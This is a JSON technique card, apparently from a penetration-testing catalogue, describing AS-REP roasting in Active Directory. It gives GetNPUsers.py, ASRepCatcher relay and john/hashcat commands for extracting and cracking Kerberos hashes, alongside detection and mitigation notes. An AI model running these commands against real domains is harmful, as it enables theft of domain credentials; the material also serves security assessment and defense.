{
  "title": "AS-REP Roasting with GetNPUsers to Offline Crack",
  "description": "Collect roastable AS-REP material from preauth-disabled accounts and crack it offline with mode-aligned workflows.",
  "version": "3.0",
  "shortDescription": "AS-REP Roast to Crack",
  "tags": [
    "password-cracking",
    "active-directory",
    "as-rep-roast",
    "kerberos",
    "credential-access"
  ],
  "metadata": {
    "descriptionHtml": "<p>This scenario extracts Kerberos AS-REP responses for accounts lacking pre-auth and routes artifacts into offline cracking with <span style='color:#ef4444;font-weight:bold;'>john</span> or <span style='color:#ef4444;font-weight:bold;'>hashcat -m 18200</span>. Direct extraction via <span style='font-weight:bold;'>GetNPUsers.py</span> and optional relay/listener capture both feed the same cracking pipeline.</p>",
    "commandsBlock": "# Step 1: Pull roastable AS-REP responses\n$ python GetNPUsers.py <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast\n\n# Optional capture path\n$ ASRepCatcher relay -dc <DC_IP>\n\n# Step 3: Crack offline\n$ john --wordlist=passwords_kerb.txt hashes.asreproast\n$ hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt",
    "prerequisites": [
      "Target accounts configured with disabled Kerberos pre-authentication",
      "Reachability to KDC (TCP/UDP 88)",
      "Authorized assessment scope for credential auditing"
    ],
    "attackerGains": [
      "Crackable AS-REP artifacts",
      "Recovered plaintext domain credentials when cracking succeeds"
    ],
    "detectionNotes": [
      "Eliminate accounts with pre-auth disabled unless strictly required",
      "Monitor unusual AS-REQ/AS-REP request patterns per source host",
      "Apply strong password controls and MFA to reduce impact"
    ],
    "mitreCategories": [
      "T1558.004",
      "T1187",
      "T1110.002",
      "T1078"
    ],
    "extraInfo": [
      "Impacket GetNPUsers.py",
      "ASRepCatcher relay/listen workflow",
      "Hashcat mode 18200 reference"
    ]
  },
